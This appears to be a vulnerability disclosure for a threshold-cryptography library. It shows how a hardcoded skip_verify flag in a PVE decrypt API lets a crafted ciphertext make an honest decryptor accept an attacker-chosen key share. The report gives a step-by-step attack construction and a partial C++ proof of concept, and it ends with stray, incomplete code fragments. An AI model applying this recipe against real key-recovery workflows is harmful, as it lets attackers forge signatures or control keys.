### Title
Hardcoded `skip_verify=true` in `pve_base_pke.cpp::decrypt` Allows Attacker-Chosen Scalar Recovery via Crafted PVE Ciphertext Blob - ([File: src/cbmpc/api/pve_base_pke.cpp])

---

### Summary

The public API function `coinbase::api::pve::decrypt()` unconditionally passes `skip_verify=true` to `ec_pve_t::decrypt()`, permanently bypassing the `ec_pve_t::verify()` proof check. Because `restore_from_decrypted()`'s only guard (`x_value * G != Q`) uses an attacker-controlled `Q` from the blob, an attacker who supplies a crafted ciphertext blob can cause the honest decryptor to recover any attacker-chosen scalar `x_target`.

---

### Finding Description

**Root cause — hardcoded bypass:**

At `pve_base_pke.cpp:278-279`, the API-level `decrypt()` calls:

```cpp
rv = pve_ct.decrypt(bridge, pve_keyref(dk_mem), pve_keyref(ek_mem), label, icurve, x_bn,
                    /*skip_verify=*/true);
``` [1](#0-0) 

Inside `ec_pve_t::decrypt()`, this flag gates the only call to `verify()`:

```cpp
if (!skip_verify && (rv = verify(base_pke, ek, Q, label))) return rv;
``` [2](#0-1) 

With `skip_verify=true`, `verify()` is never called, so the Fiat-Shamir challenge binding (`b' == b`) is never checked.

**Why `restore_from_decrypted()` is not a substitute guard:**

After skipping `verify()`, `ec_pve_t::decrypt()` iterates over rows, decrypts `c[i]` with the base PKE, and calls `restore_from_decrypted()`. The only cryptographic check inside that function is:

```cpp
if (x_value * G != Q) {
    x_value = 0;
    return coinbase::error(E_CRYPTO);
}
``` [3](#0-2) 

`Q` is deserialized directly from the attacker-supplied blob — it is not bound to any external trusted value at this point. An attacker who sets `Q = x_target * G` in the blob trivially satisfies this check for their chosen `x_target`.

**Concrete attack construction:**

The attacker has `ek` (the public encryption key, passed as a parameter to `decrypt()`). The `label` is also known (passed by the caller). The attacker:

1. Chooses target scalar `x_target`.
2. Sets `Q = x_target * G` in the blob.
3. Computes `inner_label = genPVELabelWithPoint(label, Q)` — deterministic, attacker can replicate it.
4. Picks any `x_bi` in range; computes `x_bi_bar = x_target - x_bi mod q`.
5. Encrypts `x_bi_bar` under `ek` with `inner_label` → valid ciphertext `c[i]`.
6. Sets `b` bit `i = 1`, `x_rows[i] = x_bi` in the blob.
7. Sets all other `c[j]` to garbage (they will fail `base_pke.decrypt` and be skipped via `continue`). [4](#0-3) 

When `decrypt()` runs:
- `base_pke.decrypt(dk, inner_label, c[i], x_buf)` succeeds → returns `x_bi_bar`.
- `restore_from_decrypted`: `x_value = x_bi_bar + x_bi = x_target`.
- `x_target * G == Q` → passes.
- `out_x = x_target` is returned to the caller.

The `ec_pve_t` blob fields `b`, `x_rows`, `r`, `c`, `Q` are all deserialized from attacker-supplied bytes with no external binding: [5](#0-4) 

---

### Impact Explanation

The decryptor recovers `x_target` — a scalar the attacker chose and already knows — and treats it as the legitimately encrypted secret. In any PVE-based key-transfer or key-share-recovery workflow, this means the decryptor adopts a key share whose value is fully known to the attacker. The attacker can therefore reconstruct the full private key or forge signatures without meeting the honest-participant threshold.

---

### Likelihood Explanation

The attack requires only: (a) the ability to supply a crafted ciphertext blob to the `decrypt()` API, and (b) knowledge of `ek` and `label` — both of which are public parameters passed to the same call. No privileged access, no threshold collusion, and no side-channel is needed. Any API caller or protocol peer that provides the ciphertext can execute this.

---

### Recommendation

Remove the `skip_verify=true` hardcoding. The API-level `decrypt()` should call `ec_pve_t::verify()` internally before proceeding to decryption, or the two operations should be fused so that verification cannot be bypassed. The separate `verify()` API can remain for callers who need standalone proof checking, but `decrypt()` must not silently skip it. [6](#0-5) 

---

### Proof of Concept

```cpp
// Attacker-chosen scalar
bn_t x_target = ...; // any value in [1, q-1]
ecurve_t curve = ...; // e.g. secp256k1
const auto& G = curve.generator();
const mod_t& q = curve.order();

// Step 1: craft Q
ecc_point_t Q_crafted = x_target * G;

// Step 2: pick a split
bn_t x_bi; crypto::gen_random_bn(x_bi, q);
bn_t x_bi_bar; MODULO(q) x_bi_bar = x_target - x_bi;

// Step 3: compute inner_label (same formula as pve.cpp)
buf_t inner_label = genPVELabelWithPoint(label, Q_crafted);

// Step 4: encrypt x_bi_bar under ek — produces a ciphertext that dk can decrypt
buf_t c_crafted;
base_pke.encrypt(ek, inner_label, x_bi_bar.to_bin(), rho, c_crafted);

// Step 5: assemble ec_pve_t blob
ec_pve_t crafted;
// set Q = Q_crafted, b bit 0 = 1, x_rows[0] = x_bi, c[0] = c_crafted
// all other c[i] = garbage bytes

// Step 6: serialize into pve_ciphertext_blob_v1_t and pass to decrypt()
buf_t out_x;
decrypt(curve, dk, ek, serialized_crafted_blob, label, out_x);

// out_x == x_target  ← attacker-chosen value accepted without proof check
assert(bn_t::from_bin(out_x) == x_target);
```

          coinbase::api::detail::validate_mem_arg_max_size(dk, "dk", coinbase::api::detail::MAX_OPAQUE_BLOB_SIZE))

  if (const error_t rv =

  if (rv) {
    out_x.free();
    return rv;
  }

  out_x = x_bn.to_bin(icurve.order().get_bin_size());
  return SUCCESS;
}
